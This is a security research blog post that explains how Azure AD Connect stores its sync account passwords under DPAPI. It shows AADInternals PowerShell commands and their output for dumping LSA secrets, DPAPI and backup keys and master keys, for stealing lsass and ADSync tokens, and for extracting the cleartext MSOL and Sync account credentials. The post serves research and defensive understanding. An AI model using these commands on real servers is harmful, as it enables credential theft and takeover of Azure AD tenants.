+++
title = "Decrypting ADSync passwords - my journey into DPAPI"
date = "2020-05-08"
lastmod = "2022-08-29"
categories =["blog"]
tags = ["Azure Active Directory","Active Directory", "Sync", "AADConnect"]
thumbnail = "/images/posts/ADSync.png"
+++

Microsoft changed the location of ADSync encryption keys in Azure AD Connect version 1.4.x. These keys are used to encrypt and decrypt the passwords of "service accounts" used for syncing
data from AD to Azure AD. Earlier versions saved the keys in the registry, but currently, it is using DPAPI. Thus, AADInternals couldn't decrypt the passwords anymore. 
Luckily, Dirk-jan Mollema described in his great <a href="https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/" target="_blank">article</a> how the encryption keys
could be extracted and used to decrypt the passwords. Using Dirk-jan's article as a starting point, I decided to implement this to AADInternals.

<!--more-->
# Background
Azure AD Connect synchronises information from on-prem AD to Azure AD. For this purpose, two users are created to AD and one to Azure AD. 
One of the on-prem accounts is named as AAD_012345679ab and is used to run the ADSync service (miiserver.exe). The other user is named MSOL_0123456789ab and is used
to perform the actual synchronisation operations.

The user created to Azure AD is named as Sync_XXXX_0123456789ab@company.onmicrosoft.com where XXXX is the name of the server. The postfix (random hex string) is shared with
the on-prem users. The user is given a "Directory synchronisation Accounts" role, which allows it to create, modify, and delete users and set their passwords. 

![ADSync users](/images/posts/dpapi_1.png)

As the accounts used for synchronisation have permissions to manipulate users, they need to be protected. Azure AD Connect versions 1.3.x and earlier 
saved the keyset in the registry (HKLM\Software\Microsoft\Ad Sync\Shared\). However, since 1.4.x the keyset is protected using DPAPI.

# My DPAPI journey

## What is DPAPI
Let's start by figuring out what DPAPI is. DPAPI stands for Data Protection Application Protection Interface and is a recommended way for protecting secrets in Windows.

## Master keys
DPAPI uses master keys for encrypting and decrypting secrets. User and system master keys are located at:
```
C:\Users\<user name>\AppData\Roaming\Microsoft\Protect\<user SID>\
C:\Windows\System32\Microsoft\Protect\S-1-5-18\
```
In the folder, there are one or more master key files and a file called Preferred.

```
Mode                LastWriteTime         Length Name                                                                                                                           
----                -------------         ------ ----                                                                                                                           
-a-hs-       17/12/2019     13.03            468 a65f05d8-fbac-4787-b984-1174f0becf75                                                                                           
-a-hs-       16/03/2020     10.59            740 ecae2d5a-5af0-484f-8e98-7028a56e76b3                                                                                           
-a-hs-       16/03/2020     10.59             24 Preferred
```
The preferred file contains a guid of the current master key and a time stamp.
```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000   5A 2D AE EC F0 5A 4F 48 8E 98 70 28 A5 6E 76 B3  
00000010   60 89 40 23 2A 42 D6 01                          
```
So, the current master key can be found easily using PowerShell:
{{< highlight powershell >}}
[guid][byte[]]@(0x5A, 0x2D, 0xAE, 0xEC, 0xF0, 0x5A, 0x4F, 0x48, 0x8E, 0x98, 0x70, 0x28, 0xA5, 0x6E, 0x76, 0xB3)
{{< /highlight>}}

```
Guid                                
----                                
ecae2d5a-5af0-484f-8e98-7028a56e76b3
```

The actual master key file contains three copies of user's master key: Master Key, Backup Key, and Domain Key. 
The **Master Key** is encrypted using a key derived from user's password and SID. The **Domain Key** is encrypted with a **domain backup key**.

## Credentials (secrets)
Although DPAPI can be used to protect any data, with Azure AD Connect, the passwords are stored to AAD_012345679ab user's credential vault.
The user's "vault" is located in two places:
```
C:\Users\<user name>\AppData\Local\Microsoft\Credentials
C:\Users\<user name>\AppData\Roaming\Microsoft\Credentials
```
The credential files contains information, such as the guid of the master key used to encrypt the secret, hashing algorithm, and encryption algorithm.
It also contains the actual encrypted secret, which can be any binary data.

## Getting the ADSync encryption key
The first step to get the encryption key is to locate it. In his article, Dirk-jan says that ADSync service is running as NT SERVICE\ADSync.
However, this seems not to be the case anymore. Instead, the ADSync service is using the AAD_012345679ab user created during the installation.

![ADSync users](/images/posts/dpapi_2.png)

This means that the user's secrets are located at:
```
C:\Users\AAD_2980bcb19aa3\appdata\Local\Microsoft\Credentials
```

There was only one file in the directory, so it had to be the one containing the encryption keyset. 
The beginning of the file is dumped below. The bytes 0x24-0x33 contains the master key guid.

```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   01 00 00 00 90 03 00 00 00 00 00 00 01 00 00 00  ...............
00000010   D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB  Ðß..Ñ.z.ÀOÂë
00000020   01 00 00 00 68 D8 3C 02 BE 7E 1A 4B 80 BF 85 B9  ....hØ<.¾~.K¿¹
00000030   1C 6F F2 29 00 00 00 20 30 00 00 00 4C 00 6F 00  .oò)... 0...L.o.
00000040   63 00 61 00 6C 00 20 00 43 00 72 00 65 00 64 00  c.a.l. .C.r.e.d.
00000050   65 00 6E 00 74 00 69 00 61 00 6C 00 20 00 44 00  e.n.t.i.a.l. .D.
00000060   61 00 74 00 61 00 0D 00 0A 00 00 00 03 66 00 00  a.t.a........f..
00000070   C0 00 00 00 10 00 00 00 D5 02 39 57 7A A6 B3 FF  À.......Õ.9Wz¦³.
00000080   72 16 E0 E7 61 6C A9 DB 00 00 00 00 04 80 00 00  r.àçal©Û.......
00000090   A0 00 00 00 10 00 00 00 0D AF 6A AB BC 8C B9 26   ........¯j«¼¹&
```
Again, we can use PowerShell to show the master key guid.
{{< highlight powershell >}}
[guid][byte[]]@(0x68, 0xD8, 0x3C, 0x02, 0xBE, 0x7E, 0x1A, 0x4B, 0x80, 0xBF, 0x85, 0xB9, 0x1C, 0x6F, 0xF2, 0x29)
{{< /highlight>}}

```
Guid                                
----                                
023cd868-7ebe-4b1a-80bf-85b91c6ff229
```
Now we also know the location of the user's master key!

## Decrypting the master key
According to Dirk-jan's article, ADSync user's masterkey can be decrypted using a combination of DPAPI userkey and user's SID. So, first we need to get the DPAPI userkey.

**Note:** At this point I figured out that the things required for decrypting the service users' passwords are not possible to implement as PowerShell script.
Therefore, I was forced to create a separate .dll to implement needed code in c# and use those functions from PowerShell. Most of the things are just refactored functionality from Mimikatz.

DPAPI machine key is located in LSA (Local Security Authority) secrets. Physically these are stored in registry at:
```
HKLM:\SECURITY\Policy\Secrets
```
However, the administrator doesn't have access rights to that location. Luckily, I found a way to get needed access. 
For short, an administrator can copy a kerberos token from lsass process
and gain LSA rights that way. After this, it was quite straight-forward to retrieve the LSA secrets.
{{< highlight powershell >}}
# Dump the LSA secrets
Get-AADIntLSASecrets
{{< /highlight>}}
```
Name        : $MACHINE.ACC
Password    : {1, 2, 3, 4...}
PasswordHex : 01020304..
PasswordTxt : 컓噖덭а劈－⌋결
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..

Name        : DPAPI_SYSTEM
Password    : {1, 0, 0, 0...}
PasswordHex : 0100000001082277ac85a532018930b782c30b7f2f91f7677e258665f0a016a7c215ceaf29ee1ae17b9f017b9
PasswordTxt : 挌榵
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..

Name        : NL$KM
Password    : {1, 2, 3, 4...}
PasswordHex : 01020304..
PasswordTxt : ⬡ꎛ
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..

Name        : _SC_ADSync
Password    : {1, 2, 3, 4...}
PasswordHex : 01020304..
PasswordTxt : a5bTiGcvC8fr=E;MQ331IOt/&RP,!m:qjiRXaS;xr4V#6t74;&7mXWoOoz"57K/kKTz#xdBBqb.GDKly
MD4         : {1, 2, 3, 4...}
SHA1        : {1, 2, 3, 4...}
MD4Txt      : aabbccdd..
SHA1Txt     : aabbccdd..
```

The DPAPI_SYSTEM user has a binary password containing the keys. To ease fetching the DPAPI keys, I also implemented the following function:

{{< highlight powershell >}}
# Get DPAPI keys
Get-AADIntDPAPIKeys
{{< /highlight>}}
```
UserKey               UserKeyHex                               MachineKey            MachineKeyHex                           
-------               ----------                               ----------            -------------                           
{16, 130, 39, 122...} 1082277ac85a532018930b782c30b7f2f91f7677 {226, 88, 102, 95...} e258665f0a016a7c215ceaf29ee1ae17b9f017b9
```

At this point, I noticed that _SC_ADSync had a plain-text password. The user had no rights to login normally, so I temporarely moved it to Administrators group.
After that, I was able to login as AAD_012345679ab user with _SC_ADSync password! Thus, as the user was not a virtual account as described in Dirk-jan's post, I implemented
a function to decrypt user's master key with user name, SID, and password.

{{< highlight powershell >}}
# Get user's master key
Get-AADIntUserMasterkeys -UserName AAD_2980bcb19aa3 -Password 'a5bTiGcvC8fr=E;MQ331IOt/&RP,!m:qjiRXaS;xr4V#6t74;&7mXWoOoz"57K/kKTz#xdBBqb.GDKly' -SID "S-1-5-21-xx-xx-xx-xx"
{{< /highlight>}}
```
Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
023cd868-7ebe-4b1a-80bf-85b... {236, 115, 202, 81...}  
```

Later I discovered that also the decryption using system key was needed. But first we need to get the those keys. 

{{< highlight powershell >}}
# Dump the LSA keys
Get-AADIntLSABackupKeys
{{< /highlight>}}
```
certificate        Name   Id                                   Key                   
-----------        ----   --                                   ---                   
{48, 130, 3, 0...} RSA    709d861c-56c1-4f8c-94fd-c15a91bbd991 {30, 241, 181, 176...}
                   Legacy e9ab591b-c25f-432f-97f7-a77e5c998fd3 {226, 180, 14, 151...}
```

Now that we have the LSA keys, we are able to decrypt all master keys!
{{< highlight powershell >}}
# Dump the LSA key
$rsa=Get-AADIntLSABackupKeys | where Name -eq RSA

# Get user's master key
Get-AADIntUserMasterkeys -UserName AAD_2980bcb19aa3 -SID "S-1-5-21-xx-xx-xx-xx" -SystemKey $rsa.Key
{{< /highlight>}}
```
Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
023cd868-7ebe-4b1a-80bf-85b... {236, 115, 202, 81...}  
```

## Decrypting secrets
Now that we know the location of the secrets and we have decrypted the master key, we can decrypt the encryption keys!

{{< highlight powershell >}}
# Get user's master key
$mks = Get-AADIntUserMasterkeys -UserName AAD_2980bcb19aa3 -Password 'a5bTiGcvC8fr=E;MQ331IOt/&RP,!m:qjiRXaS;xr4V#6t74;&7mXWoOoz"57K/kKTz#xdBBqb.GDKly' -SID "S-1-5-21-xx-xx-xx-xx"

# Dump user's secrets
Get-AADIntLocalUserCredentials -UserName AAD_2980bcb19aa3 -MasterKeys $mks
{{< /highlight>}}
```
Target        : LegacyGeneric:target=Microsoft_AzureADConnect_KeySet_{6F529078-33BD-448F-A9AF-20D28B1E55DC}_100000
Persistance   : local_machine
Edited        : 24/04/2020 13.03.18
Alias         : 
Comment       : 
UserName      : ADSync
Secret        : {1, 0, 0, 0...}
SecretTxt     :  賐�ᔁᇑ窌쀀쉏 鈿鄅俿鮍遤  MMS_ENCRYPTION_KEYSET_{6F529078-33BD-448F-A9AF-20D28B1E55DC}_100000 昃 À  Ｅ䖀ﶽ఍�峘ᓗ  耄 
SecretTxtUtf8 :    Ќ����z �O�   ?��L��O��d�|���   �   M M S _ E N C R Y P T I O N _ K E Y S E T _ { 6 F 5 2 9 0 7 8 - 3 3 B D - 4 4 8 F - A 9 A F - 2 0 D 2 8 B 1 E 5 5 
Attributes    : {}
```
From the output we can see that we've found the encryption keyset! 

## Decrypting ADSync encoding keyset
The closer look to the binary secret reveals that it is also a DPAPI blob, encrypted with an unknown master key.
After searching, I was able to figure out that it was one of the system's master keys! So, next, I needed a way to decrypt them:
{{< highlight powershell >}}
# Dump the LSA key
$rsa=Get-AADIntLSABackupKeys | where Name -eq RSA

# Get system master keys
Get-AADIntSystemMasterkeys -SystemKey $rsa.Key
{{< /highlight>}}
```
Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
9105923f-ef4c-4fff-8d9b-649... {203, 24, 3, 236...}
```
I already knew that the entropy needed for decrypting the key was located in ADSync configuration database.
{{< highlight powershell >}}
# Dump the key info
Get-AADIntSyncEncryptionKeyInfo
{{< /highlight>}}
```
Name                           Value 
----                           ----- 
InstanceId                     299b1d83-9dc6-479a-92f1-2357fc5abfed
Entropy                        a1c80460-6fe9-4c6f-bf31-d7a34c878dca
```

However, I was unable to decrypt the data with the correct system master key :disappointed: as it always failed with error 0x80090005 (Bad Data).

Finally, I tried to decrypt the data using the native DPAPI <a href="https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" target="_blank">CryptProtectData</a> function
with CRYPTPROTECT_LOCAL_MACHINE flag. Profit!

Now, finally,  I was able to able to decrypt and extract the encryption key!
{{< highlight powershell >}}
# Get the key info
$key_info = Get-AADIntSyncEncryptionKeyInfo

# Dump the key    
Get-AADIntSyncEncryptionKey -Entropy $key_info.Entropy -InstanceId $key_info.InstanceId
{{< /highlight>}}
```
Id     Guid                                 CryptAlg Key                   
--     ----                                 -------- ---                   
100000 299b1d83-9dc6-479a-92f1-2357fc5abfed    26128 {4, 220, 54, 13...}
```

## Final solution
As you probably noticed, I didn't implement the decryption of the "service account" passwords. Well, I actually did but those functions are not exported in AADInternals module and thus not available.
Why, you might ask.

The explanation is simple. At some point, I logged in as AAD_012345679ab user and tried if the original AADInternals Get-AADIntSyncCredentials function would work. To my surprise, it worked as a charm!
I wondered why, and ended up into a conclusion that as I was running PowerShell as AAD_012345679ab user, it had access to user's secrets and master keys. So, if it would
be possible to run the PowerShell as AAD_012345679ab user, I could extract the passwords without altering the original code at all.

Then the solution just popped into my mind! If I can get LSA rights by copying the token from the running lsass service, it should work in the similar way with AzureAD miiserver service.
I tried to copy the token as an administrator but it failed with access denied. But, if I first copied the LSA token, I got more rights and was able to copy ADSync token too!
Only problem was that after "elevating" the PowerShell session to AAD_012345679ab user, I was not able access the local configuration database. The solution was to first 
open the database once and doing the "elevation" after that. The only downside is that in order to restore the normal rights the PowerShell needs to be restarted.

So, after spending months studying and implementing DPAPI functionality to AADInternals, I didn't even needed those to decrypt the passwords! But learning something new is never a bad thing!

Now you can dump the Azure AD Connect credentials from computer where it is installed.

{{< highlight powershell >}}
# Dump the AD Connect credentials
Get-AADIntSyncCredentials
{{< /highlight>}}
```
Name                           Value
----                           -----
ADDomain                       company.com  
ADUser                         MSOL_4bc4a34e95fa
ADUserPassword                 Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...
AADUser                        Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com                                                      
AADUserPassword                $.1%(lxZ&/kNZz[r
```
With the dumped credentials you can now log in to Azure AD and pretend to be Azure AD Connect.

# Credits
Most of the things I've discussed here are inventions of others:

* Dirk-jan Mollema: <a href="https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/" target="_blank">Updating adconnectdump - a journey into DPAPI</a>
* Benjamin Delpy: <a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz source code</a>
* harmj0y: <a href="https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/" target="_blank">Operational Guidance for Offensive DPAPI Abuse</a>
* Michael Grafnetter <a href="https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/" target="_blank">Retrieving DPAPI Backup Keys from Active Directory</a>